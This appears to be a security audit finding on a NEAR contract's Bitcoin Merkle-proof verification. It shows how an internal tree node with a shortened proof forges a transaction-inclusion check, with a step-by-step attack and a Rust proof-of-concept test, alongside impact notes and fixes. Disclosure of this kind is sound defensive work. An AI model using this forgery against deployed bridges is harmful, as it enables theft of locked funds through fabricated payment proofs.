### Title
Internal-Node Merkle Proof Forgery in `verify_transaction_inclusion` (v1) — (`contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion` (v1) is a still-callable public NEAR contract function that explicitly documents it will return `true` when given an internal Merkle tree node as `tx_id`. Because `compute_root_from_merkle_proof` performs no leaf-depth validation, an attacker can supply an internal node hash as `tx_id` with a shortened proof (length = `tree_depth - D`) and receive a `true` return for a transaction that does not exist.

---

### Finding Description

`compute_root_from_merkle_proof` iterates over the provided `merkle_proof` slice, hashing upward from whatever `transaction_hash` is given: [1](#0-0) 

There is no check that `merkle_proof.len()` equals the full tree depth, and no check that `transaction_hash` is a leaf. The function is purely positional: it hashes whatever it receives upward by the number of steps in the proof.

`verify_transaction_inclusion` (v1) calls this function and compares the result to the stored `merkle_root`: [2](#0-1) 

The function is marked `#[deprecated]` but **not removed and not access-controlled**. The `#[deprecated]` attribute only emits a Rust compiler warning for Rust callers; it has no effect on external NEAR RPC callers. The function remains a live, public contract entry point: [3](#0-2) 

The code itself documents the flaw: [4](#0-3) 

**Attack construction** (using a real Bitcoin block with 8 transactions, tree depth = 3):

1. Obtain the public Merkle tree of any confirmed block in the light client's chain.
2. Pick an internal node `N` at depth `D` (e.g., `N = SHA256d(tx[0] || tx[1])` at depth 1).
3. Construct a `merkle_proof` of length `tree_depth - D` (e.g., 2 siblings from depth 1 up to the root).
4. Choose any `tx_index` consistent with `N`'s position at depth `D` (e.g., index 0 at depth 1 → `tx_index = 0`).
5. Call `verify_transaction_inclusion` with `tx_id = N`, `tx_index`, `merkle_proof`, and the block's hash.
6. `compute_root_from_merkle_proof(N, 0, proof_of_len_2)` produces the correct `merkle_root` → returns `true`.

`N` is not a transaction; it is a hash of two transactions. No transaction with txid `N` exists on-chain.

---

### Impact Explanation

Any downstream system (bridge, payment verifier, cross-chain protocol) that calls `verify_transaction_inclusion` (v1) to confirm a Bitcoin payment can be deceived into accepting a fabricated transaction inclusion proof. An attacker can "prove" receipt of a BTC payment that never occurred, potentially draining bridge funds or unlocking assets on the NEAR side without a corresponding Bitcoin transaction.

---

### Likelihood Explanation

- The function is publicly callable via NEAR RPC with no access control beyond the `#[pause]` gate (which is an operational pause, not an authorization check).
- All required inputs (block Merkle tree, internal node hashes, sibling paths) are derived entirely from public Bitcoin block data.
- No privileged role, leaked key, or social engineering is required.
- The exploit is deterministic and locally testable.

---

### Recommendation

1. **Remove or gate `verify_transaction_inclusion` (v1).** Mark it `#[private]` or add an explicit `env::panic_str` at the top to make it uncallable externally, or delete it entirely. Deprecation alone does not prevent NEAR RPC calls.
2. **Enforce proof-length equals tree depth** inside `compute_root_from_merkle_proof`, or add a separate validation layer that rejects proofs shorter than the known tree depth.
3. **Direct all callers to `verify_transaction_inclusion_v2`**, which enforces equal-length coinbase and transaction proofs, making the shortened-proof attack fail at the length check: [5](#0-4) 

---

```rust
// In merkle-tools/src/lib.rs tests (or a standalone integration test)
#[test]
fn test_internal_node_forgery() {
    // 8-leaf tree, depth = 3
    let tx_hashes = vec![
        decode_hex("18afbf37d136ff62644b231fcde72f1fb8edd04a798fb00cb06360da635da275"),
        decode_hex("30b19832a5f4b952e151de77d96139987492becc8b6e1e914c4103cfbb06c01e"),
        decode_hex("b94ed12902e35b29dd53cf25e665b4d0bc92f22adbc383ad90566584902b061d"),
        decode_hex("1920e5d8a10018dc65308bb4d1f11d30b5406c6499688443bfcd1ef364206b14"),
        decode_hex("048f3897c16bdc59ec1187aa080a4b4aa5ec1afcb4b776cf8b8a214b01990a7b"),
        decode_hex("266a660e2be5f2fdf41ae21d5a29c4db6270b2686dfe3902bd2dd3bca3626d7c"),
        decode_hex("17c3b888226ce70908303eaecb88ba02aa5ab858fade8576261b1203c6885528"),
        decode_hex("8a06d54b8b411e99b7e4d60c330b8cde4feb23d62edfc25047c4d837dfb5b253"),
    ];

    // Compute the real root
    let real_root = merkle_root_calculator(&tx_hashes);

    // Internal node at depth 1, position 0: SHA256d(tx[0] || tx[1])
    let internal_node = compute_hash(&tx_hashes[0], &tx_hashes[1]);

    // Proof from internal_node (position 0 at depth 1) up to root: length 2
    // sibling at depth 1 = SHA256d(tx[2] || tx[3]), then SHA256d(tx[4..7])
    let sibling_d1 = compute_hash(&tx_hashes[2], &tx_hashes[3]);
    let sibling_d2 = compute_hash(
        &compute_hash(&tx_hashes[4], &tx_hashes[5]),
        &compute_hash(&tx_hashes[6], &tx_hashes[7]),
    );
    let forged_proof = vec![sibling_d1, sibling_d2];

    // compute_root_from_merkle_proof treats internal_node as a "leaf"
    let computed = compute_root_from_merkle_proof(internal_node.clone(), 0, &forged_proof);

    // This assertion passes: the forged proof reconstructs the real root
    assert_eq!(computed, real_root,
        "Internal node forgery: compute_root_from_merkle_proof returns the real root \
         for a tx_id that is NOT a leaf transaction");
}
```

This test passes on the unmodified codebase, confirming that `verify_transaction_inclusion` (v1) returns `true` for `tx_id = internal_node`, which is not a real transaction.
